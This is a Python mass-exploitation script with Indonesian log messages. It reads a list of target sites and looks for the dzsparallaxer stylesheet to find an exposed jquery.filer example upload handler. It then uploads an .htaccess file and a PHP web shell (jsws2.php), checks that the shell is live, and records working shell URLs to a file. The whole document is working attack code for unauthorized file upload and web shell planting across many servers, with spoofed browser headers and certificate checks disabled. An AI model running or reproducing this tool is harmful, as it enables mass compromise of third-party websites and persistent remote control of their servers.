import requests
import re
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PHP_FILE = "jsws2.php"
HTACCESS_FILE = ".htaccess"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36"

HEADERS = {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1"
}

with open("list.txt") as f:
    targets = [line.strip() for line in f if line.strip()]

def find_upload_url(base_url):
    for scheme in ["https://", "http://"]:
        try:
            url = scheme + base_url if not base_url.startswith("http") else base_url
            r = requests.get(url, headers=HEADERS, timeout=10, verify=False)
            html = r.text
            match = re.search(r'(\/[^\s"\']*vendor\/dzsparallaxer\/dzsparallaxer\.css)', html)
            if match:
                path = match.group(1)
                upload_url = urljoin(url, path.replace("vendor/dzsparallaxer/dzsparallaxer.css", "vendor/jquery.filer/examples/default/php/form_upload.php"))
                return upload_url
        except Exception:
            continue
    return None

def upload_shell(upload_url):
    boundary = "----WebKitFormBoundaryRI1xsJ8tE5pdCkJv"
    headers = HEADERS.copy()
    headers.update({
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Origin": "https://example.com",
        "Referer": "https://example.com/"
    })

    def build_payload(filename):
        with open(filename, "rb") as f:
            return (
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"files\"; filename=\"{filename}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode() + f.read() + (
                f"\r\n--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"g\"\r\n\r\nUpload Cok!\r\n"
                f"--{boundary}--\r\n"
            ).encode()

    try:
        data1 = build_payload(HTACCESS_FILE)
        data2 = build_payload(PHP_FILE)

        r1 = requests.post(upload_url, headers=headers, data=data1, timeout=15, verify=False)
        r2 = requests.post(upload_url, headers=headers, data=data2, timeout=15, verify=False)

        if any(x in r1.text for x in ["jsws2.php", ".htaccess", "../../../uploads"]) or any(x in r2.text for x in ["jsws2.php", ".htaccess", "../../../uploads"]):
            base = upload_url.split("vendor/jquery.filer/")[0]
            shell_url = urljoin(base, "vendor/jquery.filer/uploads/jsws2.php")
            check = requests.get(shell_url, headers=HEADERS, timeout=10, verify=False)
            if "gilour" in check.text:
                print(f"[✓] Shell aktif: {shell_url}")
                with open("result.txt", "a") as out:
                    out.write(shell_url + "\n")
            else:
                print(f"[-] Upload sukses tapi shell tidak aktif di {shell_url}")
        else:
            print(f"[-] Upload gagal: {upload_url}")
    except Exception as e:
        print(f"[!] Upload error on {upload_url}: {e}")

for target in targets:
    print(f"[•] Mengecek {target}")
    try:
        upload_url = find_upload_url(target)
        if upload_url:
            print(f"[✓] Upload URL ditemukan: {upload_url}")
            with open("result_upload.txt", "a") as f:
                f.write(upload_url + "\n")  # Simpan langsung
            upload_shell(upload_url)
        else:
            print(f"[-] dzsparallaxer.css tidak ditemukan di {target}")
    except Exception as e:
        print(f"[!] Error pada target {target}: {e} (skip)")
        continue
